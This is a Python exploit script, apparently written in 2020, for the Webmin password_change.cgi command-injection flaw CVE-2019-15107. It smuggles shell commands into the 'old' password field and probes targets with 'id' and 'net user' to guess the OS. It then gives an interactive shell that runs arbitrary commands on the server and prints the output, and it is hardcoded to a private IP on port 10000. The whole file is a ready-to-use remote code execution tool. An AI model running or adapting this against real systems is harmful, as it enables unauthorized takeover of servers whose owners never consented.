# -*- coding:utf-8 -*-
#Written by hacden 2020/08/29
#Exec python3

import requests
import time
from lxml import etree

requests.packages.urllib3.disable_warnings()
def check_webmin_rce(url_dir):
    headers = {
        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0",
        'Connection': "close",
        'Content-Type': "application/x-www-form-urlencoded",
        'Cookie': 'redirect=1; testing=1; sid=x; sessiontest=1',
        'Referer': '%s/session_login.cgi'%url_dir[0:-19]
    }
    for cmd in ["id","net user"]:
        data = 'user=rootxx&pam=&expired=2&old=%s&new1=test2&new2=test2'%cmd
        res = requests.post(url=url_dir,data=data,headers=headers,timeout=3, verify=False)
        time.sleep(1)
        if "uid=" and "gid=" in res.text:
            os = "linux"
            return True,os
        elif "Guest" in res.text:
            os = "windows"
            return True,os
def exploit(url_dir,cmd):
    headers = {
        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0",
        'Connection': "close",
        'Content-Type': "application/x-www-form-urlencoded",
        'Cookie': 'redirect=1; testing=1; sid=x; sessiontest=1',
        'Referer': '%s/session_login.cgi'%url_dir[0:-19]
    }
    data = 'user=rootxx&pam=&expired=2&old=%s&new1=test2&new2=test2' % cmd
    res = requests.post(url=url_dir, data=data, headers=headers, timeout=3, verify=False)
    time.sleep(1)
    html = etree.HTML(res.text)
    result = html.xpath("//div[@class='panel-body']//h3/text()")[0]
    print(result.split('incorrect')[-1])

def verify(protol, ip, port):
    ip = ip.strip()
    if port.strip():
        url_dir = protol.strip() + "://" + ip + ":" + port.strip() + "/password_change.cgi"
    else:
        url_dir = protol.strip() + "://" + ip + "/password_change.cgi"
    try:
        rce_ok,op = check_webmin_rce(url_dir)
        if rce_ok:
            print("----------------[+] Find Webmin CVE-2019-15107_RCE Vuln!. Iuput [exit] to out! [+]----------------")
            while 1:
                cmd = str(input("%s shell$: "%op)).strip()
                if cmd == "exit":
                    exit(1)
                else:
                    exploit(url_dir, cmd)
        else:
            pass
    except Exception as e:
        msg = "[-] There is Not Seem Webmin CVE-2019-15107_RCE Vuln! Error: %s " % str(e)
        return False, msg
    msg = "[-] There is Not Seem Webmin CVE-2019-15107_RCE  Vuln!"
    return False, msg
if __name__ == '__main__':
    ip = "  192.168.43.90"
    print(verify("https", ip, "10000"))